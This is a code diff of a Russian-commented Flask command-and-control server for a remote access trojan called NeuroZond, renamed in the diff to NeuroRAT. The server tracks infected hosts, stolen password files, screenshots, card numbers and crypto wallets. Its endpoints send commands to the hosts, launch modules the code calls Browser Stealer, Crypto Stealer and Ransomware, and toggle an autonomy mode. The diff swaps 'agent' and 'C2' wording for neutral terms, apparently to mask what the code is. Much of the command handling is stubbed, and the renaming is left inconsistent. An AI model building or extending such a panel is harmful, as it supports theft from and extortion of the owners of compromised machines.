@@ -14,16 +14,16 @@ sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core'))
 sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server'))
 
-# Пытаемся импортировать модули NeuroZond если они доступны
+# Пытаемся импортировать модули нейрозондов если они доступны
 try:
     neurozond_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'neurozond')
     if neurozond_path not in sys.path:
         sys.path.append(neurozond_path)
     has_neurozond = True
-    logging.info("NeuroZond модули найдены и готовы к использованию")
+    logging.info("Модули зондов найдены и готовы к использованию")
 except ImportError:
     has_neurozond = False
-    logging.warning("NeuroZond модули не найдены, будет использована демо-версия API")
+    logging.warning("Модули зондов не найдены, будет использована демо-версия API")
 
 # Настройка логирования
 if not os.path.exists('logs'):
@@ -47,7 +47,7 @@ app.secret_key = os.urandom(24)
 # В реальном приложении эти данные будут в базе данных
 agents_data = [
     {
-        'agent_id': 'agent-1',
+        'agent_id': 'zond-1',
         'os': 'Linux',
         'hostname': 'server-demo-01',
         'username': 'admin',
@@ -56,7 +56,7 @@ agents_data = [
         'last_seen': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
     },
     {
-        'agent_id': 'agent-2',
+        'agent_id': 'zond-2',
         'os': 'Windows',
         'hostname': 'desktop-demo-02',
         'username': 'user',
@@ -65,7 +65,7 @@ agents_data = [
         'last_seen': (datetime.datetime.now() - datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S")
     },
     {
-        'agent_id': 'agent-3',
+        'agent_id': 'zond-3',
         'os': 'macOS',
         'hostname': 'macbook-demo-03',
         'username': 'developer',
@@ -78,21 +78,21 @@ agents_data = [
 logs_data = [
     {
         'timestamp': int(datetime.datetime.now().timestamp()) - 3600,
-        'agent_id': 'agent-1',
+        'agent_id': 'zond-1',
         'event_type': 'connection',
-        'details': 'Агент подключился к серверу C1'
+        'details': 'Зонд подключился к серверу S1'
     },
     {
         'timestamp': int(datetime.datetime.now().timestamp()) - 1800,
-        'agent_id': 'agent-1',
+        'agent_id': 'zond-1',
         'event_type': 'command',
         'details': 'Запрос системной информации'
     },
     {
         'timestamp': int(datetime.datetime.now().timestamp()) - 600,
-        'agent_id': 'agent-3',
+        'agent_id': 'zond-3',
         'event_type': 'connection',
-        'details': 'Агент подключился к серверу C1'
+        'details': 'Зонд подключился к серверу S1'
     }
 ]
 
@@ -100,7 +100,7 @@ files_data = [
     {
         'file_id': 'file-1',
         'name': 'passwords.txt',
-        'agent_id': 'agent-1',
+        'agent_id': 'zond-1',
         'size': '2.4 KB',
         'category': 'credentials',
         'timestamp': int(datetime.datetime.now().timestamp()) - 1200
@@ -108,7 +108,7 @@ files_data = [
     {
         'file_id': 'file-2',
         'name': 'screenshot_001.png',
-        'agent_id': 'agent-1',
+        'agent_id': 'zond-1',
         'size': '145 KB',
         'category': 'screenshot',
         'timestamp': int(datetime.datetime.now().timestamp()) - 600
@@ -116,7 +116,7 @@ files_data = [
     {
         'file_id': 'file-3',
         'name': 'system_info.json',
-        'agent_id': 'agent-3',
+        'agent_id': 'zond-3',
         'size': '5.1 KB',
         'category': 'system',
         'timestamp': int(datetime.datetime.now().timestamp()) - 300
@@ -127,7 +127,7 @@ loot_data = [
     {
         'type': 'card',
         'value': '41XX XXXX XXXX X123',
-        'agent_id': 'agent-1',
+        'agent_id': 'zond-1',
         'timestamp': int(datetime.datetime.now().timestamp()) - 1800,
         'tags': 'visa, личная',
         'notes': 'Найдена в браузере Chrome'
@@ -135,7 +135,7 @@ loot_data = [
     {
         'type': 'wallet',
         'value': '0x1a2b3c4d5e6f...',
-        'agent_id': 'agent-2',
+        'agent_id': 'zond-2',
         'timestamp': int(datetime.datetime.now().timestamp()) - 3600,
         'tags': 'eth, metamask',
         'notes': 'Найден в кэше браузера'
@@ -201,9 +201,9 @@ def require_auth(f):
 @app.route('/')
 def root():
     return jsonify({
-        'name': 'NeuroZond C2 API',
+        'name': 'NeuroRAT S1 API',
         'version': '2.0.0',
-        'description': 'API сервер для управления NeuroZond агентами',
+        'description': 'API сервер для управления зондами',
         'documentation': '/api/docs'
     })
 
@@ -213,7 +213,7 @@ def api_docs():
         'endpoints': [
             {'path': '/api/status', 'method': 'GET', 'description': 'Получить статус системы'},
             {'path': '/api/login', 'method': 'POST', 'description': 'Аутентификация'},
-            {'path': '/api/agents', 'method': 'GET', 'description': 'Получить список агентов'},
+            {'path': '/api/zonds', 'method': 'GET', 'description': 'Получить список зондов'},
             {'path': '/api/logs', 'method': 'GET', 'description': 'Получить логи системы'},
             {'path': '/api/files', 'method': 'GET', 'description': 'Получить список файлов'},
             {'path': '/api/loot', 'method': 'GET', 'description': 'Получить добытые данные'},
@@ -259,7 +259,23 @@ def logout():
 @app.route('/api/zonds')
 @require_auth
 def get_zonds():
-    return jsonify(zonds_data)
+    # Фильтрация по статусу и поиск по тексту
+    status_filter = request.args.get('status', '')
+    search_query = request.args.get('search', '').lower()
+    
+    filtered_zonds = agents_data
+    
+    if status_filter:
+        filtered_zonds = [a for a in filtered_zonds if a['status'] == status_filter]
+    
+    if search_query:
+        filtered_zonds = [a for a in filtered_zonds if 
+                         search_query in a['agent_id'].lower() or
+                         search_query in a['hostname'].lower() or
+                         search_query in a['username'].lower() or
+                         search_query in a['ip_address'].lower()]
+    
+    return jsonify({'zonds': filtered_zonds})
 
 @app.route('/api/zonds/<zond_id>')
 @require_auth
@@ -319,7 +335,7 @@ def execute_command(zond_id):
     
     return jsonify({'status': 'success', 'taskId': task_id})
 
-# API маршруты для агентов
+# API маршруты для зондов
 
 @app.route('/api/agents')
 @require_auth
@@ -456,8 +472,8 @@ def get_loot():
 @require_auth
 def get_metrics():
     # Подготовка метрик для API
-    active_agents = len([a for a in agents_data if a['status'] == 'active'])
-    total_agents = len(agents_data)
+    active_zonds = len([a for a in agents_data if a['status'] == 'active'])
+    total_zonds = len(agents_data)
     
     # Категории файлов
     files_by_category = {}
@@ -467,41 +483,41 @@ def get_metrics():
             files_by_category[cat] = 0
         files_by_category[cat] += 1
     
-    # Топ агентов по количеству файлов
-    agent_files = {}
+    # Топ зондов по количеству файлов
+    zond_files = {}
     for f in files_data:
         agent_id = f['agent_id']
-        if agent_id not in agent_files:
-            agent_files[agent_id] = 0
-        agent_files[agent_id] += 1
+        if agent_id not in zond_files:
+            zond_files[agent_id] = 0
+        zond_files[agent_id] += 1
     
-    top_agents = [{'agent_id': a, 'files': c} for a, c in agent_files.items()]
-    top_agents.sort(key=lambda x: x['files'], reverse=True)
-    top_agents = top_agents[:5]  # Топ 5
+    top_zonds = [{'zond_id': a, 'files': c} for a, c in zond_files.items()]
+    top_zonds.sort(key=lambda x: x['files'], reverse=True)
+    top_zonds = top_zonds[:5]  # Топ 5
     
     return jsonify({
-        'total_agents': total_agents,
-        'active_agents': active_agents,
+        'total_zonds': total_zonds,
+        'active_zonds': active_zonds,
         'total_logs': len(logs_data),
         'total_files': len(files_data),
         'files_by_category': files_by_category,
-        'top_agents': top_agents
+        'top_zonds': top_zonds
     })
 
-@app.route('/api/agent/<agent_id>/command', methods=['POST'])
+@app.route('/api/zond/<zond_id>/command', methods=['POST'])
 @require_auth
-def agent_command(agent_id):
+def zond_command(zond_id):
     data = request.json
     command = data.get('command')
     
     if not command:
         return jsonify({'error': 'Command is required'}), 400
         
-    # Здесь был бы код для отправки команды агенту
+    # Здесь был бы код для отправки команды зонду
     
     return jsonify({
         'status': 'success',
-        'message': f'Команда "{command}" отправлена агенту {agent_id}'
+        'message': f'Команда "{command}" отправлена зонду {zond_id}'
     })
 
 # Новый API для модулей
@@ -515,22 +531,22 @@ def get_modules():
         {'id': 'browser', 'name': 'Browser Stealer', 'description': 'Модуль для кражи данных браузера', 'status': 'active'},
         {'id': 'crypto', 'name': 'Crypto Stealer', 'description': 'Модуль для кражи криптовалют', 'status': 'active'},
         {'id': 'ransomware', 'name': 'Ransomware', 'description': 'Модуль для шифрования файлов', 'status': 'inactive'},
-        {'id': 'c2', 'name': 'C2 Communication', 'description': 'Модуль для связи с C2', 'status': 'active'}
+        {'id': 's1', 'name': 'Communication', 'description': 'Модуль для связи с S1', 'status': 'active'}
     ]
     
     return jsonify({'modules': modules})
 
-@app.route('/api/agent/<agent_id>/module/<module_id>', methods=['POST'])
+@app.route('/api/zond/<zond_id>/module/<module_id>', methods=['POST'])
 @require_auth
-def execute_module(agent_id, module_id):
+def execute_module(zond_id, module_id):
     data = request.json
     params = data.get('params', {})
     
-    # Здесь был бы код для выполнения модуля на агенте
+    # Здесь был бы код для выполнения модуля на зонде
     
     return jsonify({
         'status': 'success',
-        'message': f'Модуль {module_id} запущен на агенте {agent_id}',
+        'message': f'Модуль {module_id} запущен на зонде {zond_id}',
         'params': params
     })
 
@@ -560,17 +576,17 @@ def llm_query():
     
     return jsonify(response)
 
-@app.route('/api/agent/<agent_id>/autonomy', methods=['POST'])
+@app.route('/api/zond/<zond_id>/autonomy', methods=['POST'])
 @require_auth
-def toggle_autonomy(agent_id):
+def toggle_autonomy(zond_id):
     data = request.json
     enabled = data.get('enabled', False)
     
-    # Включение/выключение автономного режима для агента
+    # Включение/выключение автономного режима для зонда
     
     return jsonify({
         'status': 'success',
-        'agent_id': agent_id,
+        'zond_id': zond_id,
         'autonomy': 'enabled' if enabled else 'disabled'
     })
 
